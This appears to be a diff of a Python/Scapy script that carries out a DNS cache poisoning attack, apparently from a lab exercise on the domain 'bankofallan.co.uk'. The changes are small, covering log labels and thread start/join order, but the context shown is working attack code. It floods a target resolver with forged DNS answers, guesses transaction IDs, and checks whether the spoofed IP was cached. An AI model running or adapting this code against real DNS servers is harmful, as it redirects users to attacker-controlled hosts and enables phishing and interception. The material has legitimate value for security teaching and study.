@@ -101,7 +101,7 @@ def sender_job_2():
 
         response = sr1(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="bankofallan.co.uk")))
         # TODO valutare se an o ar e togliere la print
-        print "response: " + str(response[0].getlayer(DNS).an.rdata)
+        print "[SENDER]         response: " + str(response[0].getlayer(DNS).an.rdata)
         if response[0].getlayer(DNS).an.rdata == DNS_SPOOF_IP:
                 RESTART = 1
                 N_TRY = N_TRY + 1
@@ -144,7 +144,7 @@ def flooding_job(passo):
 
                 # build the packet
                 q_id = ((Q_ID + 1 + passo*step + count) % 65535)
-                print ('trying with ' + str(hex(q_id)))
+                print ('[FLOODER]       trying with ' + str(hex(q_id)))
                 pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
                       DNS(id= q_id, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                           qdcount=1, ancount=1,
@@ -224,6 +224,7 @@ def master_job():
                 flooder_7 = FirstThread(name="flood7", job=3, flood=7)
 
                 # TODO sinconia tra bad client e flooders
+                bad_client_thread.start()
                 flooder_0.start()
                 flooder_1.start()
                 flooder_2.start()
@@ -232,8 +233,8 @@ def master_job():
                 flooder_5.start()
                 flooder_6.start()
                 flooder_7.start()
-                bad_client_thread.start()
 
+                bad_client_thread.join()
                 flooder_0.join()
                 flooder_1.join()
                 flooder_2.join()
@@ -242,7 +243,6 @@ def master_job():
                 flooder_5.join()
                 flooder_6.join()
                 flooder_7.join()
-                bad_client_thread.join()
 
         if GOAL == 1:
                 print "Goal reached."
@@ -254,4 +254,3 @@ def master_job():
         #listener_thread.join()
 
 master_job()
-#COMMENTO ALLA FINE
